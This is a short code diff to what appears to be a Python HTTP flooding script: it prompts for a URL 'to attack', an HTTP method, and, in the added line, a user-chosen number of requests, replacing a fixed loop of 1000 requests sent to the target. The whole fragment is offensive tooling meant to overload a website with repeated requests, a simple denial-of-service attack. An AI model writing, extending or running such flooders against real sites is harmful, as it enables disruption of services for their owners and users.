@@ -8,10 +8,11 @@ red = colorama.Fore.RED
 
 url = input(green + "Enter the URL to attack: ")
 method = input(green + "Enter the HTTP method (GET/POST/FETCH): ").upper()
+numero = input(green + "Enter the number of requests to send: ")
 input(green + "are you sure you want to attack this URL? (Press Enter to continue)")
 os.system("cls" if os.name == "nt" else "clear")
 
-for i in range(1000):
+for i in range(int(numero)):
     try:
         if method == "GET":
             response = requests.get(url)
